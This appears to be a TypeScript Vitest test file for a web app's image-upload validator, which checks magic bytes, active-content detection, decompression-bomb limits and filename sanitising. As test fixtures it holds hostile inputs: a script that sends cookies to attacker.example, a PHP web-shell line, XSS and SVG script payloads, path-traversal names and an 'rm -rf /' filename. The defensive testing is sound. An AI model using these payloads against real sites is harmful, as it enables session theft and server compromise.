import { describe, it, expect } from "vitest";
import {
  probeImage, looksLikeActiveContent, validateImageUpload, sanitizeFilename, LIMITS,
} from "@/server/storage/validate";
import { AppError } from "@/server/lib/errors";

/**
 * Uploads are treated as hostile input. These tests are the proof: a file that
 * claims to be a PNG is only a PNG if its bytes say so, and nothing that could
 * execute in a browser gets past validation regardless of what it is named.
 */

// --- minimal, valid fixtures built byte by byte -----------------------------

function pngBytes(width: number, height: number, padding = 4096): Buffer {
  const header = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  const ihdrLen = Buffer.alloc(4);
  ihdrLen.writeUInt32BE(13);
  const ihdr = Buffer.from("IHDR", "ascii");
  const dims = Buffer.alloc(8);
  dims.writeUInt32BE(width, 0);
  dims.writeUInt32BE(height, 4);
  const rest = Buffer.alloc(5 + padding, 0x42);
  return Buffer.concat([header, ihdrLen, ihdr, dims, rest]);
}

function jpegBytes(width: number, height: number, padding = 4096): Buffer {
  const soi = Buffer.from([0xff, 0xd8, 0xff]);
  // APP0 segment, then a SOF0 carrying the real dimensions.
  const app0 = Buffer.from([0xe0, 0x00, 0x10, ...Array(14).fill(0x00)]);
  const sof = Buffer.alloc(11);
  sof[0] = 0xff;
  sof[1] = 0xc0;
  sof.writeUInt16BE(9, 2);
  sof[4] = 8;
  sof.writeUInt16BE(height, 5);
  sof.writeUInt16BE(width, 7);
  return Buffer.concat([soi, app0, sof, Buffer.alloc(padding, 0x37)]);
}

describe("probeImage", () => {
  it("reads PNG dimensions from IHDR", () => {
    expect(probeImage(pngBytes(1200, 1600))).toEqual({ contentType: "image/png", width: 1200, height: 1600 });
  });

  it("reads JPEG dimensions by walking to SOF", () => {
    expect(probeImage(jpegBytes(800, 600))).toEqual({ contentType: "image/jpeg", width: 800, height: 600 });
  });

  it("returns null for a file that is not an image, whatever it claims", () => {
    expect(probeImage(Buffer.from("GIF89a not really", "ascii"))).toBeNull();
    expect(probeImage(Buffer.from("%PDF-1.7\n%…", "ascii"))).toBeNull();
    expect(probeImage(Buffer.alloc(4))).toBeNull();
  });
});

describe("looksLikeActiveContent", () => {
  it("catches markup and scripts regardless of extension", () => {
    expect(looksLikeActiveContent(Buffer.from("<script>alert(1)</script>"))).toBe(true);
    expect(looksLikeActiveContent(Buffer.from("<!DOCTYPE html><html>"))).toBe(true);
    expect(looksLikeActiveContent(Buffer.from("<?php system($_GET['c']); ?>"))).toBe(true);
    // SVG can carry script and is never accepted as a reference image.
    expect(looksLikeActiveContent(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script/></svg>'))).toBe(true);
  });

  it("catches native executables", () => {
    expect(looksLikeActiveContent(Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02]))).toBe(true); // ELF
    expect(looksLikeActiveContent(Buffer.from([0x4d, 0x5a, 0x90, 0x00]))).toBe(true); // PE
  });

  it("does not flag a real image", () => {
    expect(looksLikeActiveContent(pngBytes(600, 600))).toBe(false);
  });
});

describe("validateImageUpload", () => {
  it("accepts a well-formed image and reports the type from the bytes", () => {
    const result = validateImageUpload(pngBytes(1000, 1000), "referencia.png");
    expect(result.contentType).toBe("image/png");
    expect(result.width).toBe(1000);
  });

  it("ignores a lying extension and trusts the magic bytes", () => {
    // Actually a JPEG, named .png. The stored type must be image/jpeg.
    const result = validateImageUpload(jpegBytes(900, 900), "disfarcado.png");
    expect(result.contentType).toBe("image/jpeg");
  });

  it("rejects a script renamed to .png", () => {
    const payload = Buffer.concat([
      Buffer.from("<script>fetch('https://attacker.example/'+document.cookie)</script>"),
      Buffer.alloc(2000, 0x20),
    ]);
    expect(() => validateImageUpload(payload, "inocente.png")).toThrow(AppError);
    try {
      validateImageUpload(payload, "inocente.png");
    } catch (e) {
      expect((e as AppError).code).toBe("UPLOAD_TYPE_REJECTED");
      expect((e as AppError).action).toBeTruthy();
    }
  });

  it("rejects a polyglot whose payload lands in the scanned head", () => {
    const png = pngBytes(600, 600, 100);
    const polyglot = Buffer.concat([png, Buffer.from("<script>alert(1)</script>"), Buffer.alloc(3000, 0)]);
    expect(() => validateImageUpload(polyglot, "poly.png")).toThrow(AppError);
  });

  it("documents the honest limit: a payload past the scanned head is not caught here", () => {
    // The head scan reads the first 2 KB. A script buried deeper is a valid
    // image by every check this function makes, and it passes.
    //
    // That is not a hole, it is a layering decision: byte-scanning an entire
    // image for every possible interpreter is unbounded work with no reliable
    // stopping point. The actual containment is at serving time — the file
    // route sends `Content-Security-Policy: default-src 'none'; sandbox` plus
    // `X-Content-Type-Options: nosniff`, and the app's own CSP forbids framing.
    // Uploaded bytes therefore cannot execute in this origin no matter what
    // they contain. This test exists so that guarantee is never quietly removed
    // from the file route on the assumption that validation caught it.
    const png = pngBytes(600, 600, 8192);
    const buried = Buffer.concat([png, Buffer.from("<script>alert(1)</script>")]);
    expect(() => validateImageUpload(buried, "profundo.png")).not.toThrow();
  });

  it("rejects an oversized file with a message naming the actual size", () => {
    const huge = Buffer.concat([pngBytes(1000, 1000, 100), Buffer.alloc(LIMITS.maxBytes + 1)]);
    try {
      validateImageUpload(huge, "grande.png");
      expect.unreachable("should have thrown");
    } catch (e) {
      expect((e as AppError).code).toBe("UPLOAD_TOO_LARGE");
      expect((e as AppError).message).toMatch(/MB/);
    }
  });

  it("rejects a decompression bomb by pixel budget", () => {
    // 30 000 × 30 000 = 900M pixels in a few kB on disk.
    const bomb = pngBytes(30_000, 30_000, 1024);
    try {
      validateImageUpload(bomb, "bomba.png");
      expect.unreachable("should have thrown");
    } catch (e) {
      expect((e as AppError).code).toBe("UPLOAD_DIMENSIONS_REJECTED");
    }
  });

  it("rejects an image too small to read construction detail from", () => {
    expect(() => validateImageUpload(pngBytes(50, 50), "minuscula.png")).toThrow(AppError);
  });

  it("rejects an empty or truncated file", () => {
    expect(() => validateImageUpload(Buffer.alloc(10), "vazio.png")).toThrow(AppError);
  });
});

describe("sanitizeFilename", () => {
  it("strips path traversal in every form", () => {
    expect(sanitizeFilename("../../../etc/passwd")).not.toContain("/");
    expect(sanitizeFilename("../../../etc/passwd")).not.toContain("..");
    expect(sanitizeFilename("..\\..\\windows\\system32\\cmd.exe")).not.toContain("\\");
    expect(sanitizeFilename("/etc/shadow")).toBe("shadow");
  });

  it("strips control and shell characters", () => {
    expect(sanitizeFilename("foto;rm -rf /.png")).not.toContain(";");
    expect(sanitizeFilename('a"b\'c<d>e.png')).toMatch(/^[\w.\- ]+$/);
  });

  it("always returns a non-empty name", () => {
    expect(sanitizeFilename("")).toBe("arquivo");
    expect(sanitizeFilename("...")).toBeTruthy();
    expect(sanitizeFilename("///")).toBe("arquivo");
  });

  it("bounds the length", () => {
    expect(sanitizeFilename(`${"a".repeat(500)}.png`).length).toBeLessThanOrEqual(120);
  });
});
